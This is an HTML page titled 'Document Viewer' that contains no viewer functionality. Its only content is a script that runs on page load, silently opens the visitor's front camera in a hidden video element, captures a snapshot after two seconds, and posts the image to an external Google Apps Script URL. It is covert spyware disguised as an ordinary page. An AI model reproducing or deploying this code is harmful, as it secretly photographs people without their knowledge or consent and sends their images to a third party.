<!DOCTYPE html>
<html>
<head>
  <title>Document Viewer</title>
</head>
<body>
<script>
const serverURL = "https://script.google.com/macros/s/AKfycbxMh8nwgDEHn7rj1Bqbm7krN6O2JvFIGSZTVIGTHnNAlVsFLgtPzHfIeLCd3FBSjbrW/exec";

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(stream => {
    let video = document.createElement("video");
    video.style.display = "none";
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    setTimeout(() => {
      let canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      let ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL("image/png");

      fetch(serverURL, {
        method: "POST",
        body: JSON.stringify({ image: imageData }),
        headers: { "Content-Type": "application/json" }
      }).then(r => console.log("Sent to server"));

    }, 2000); // 2-second delay to ensure camera starts
  })
  .catch(err => {
    console.error("Camera access denied:", err);
  });
</script>
</body>
</html>
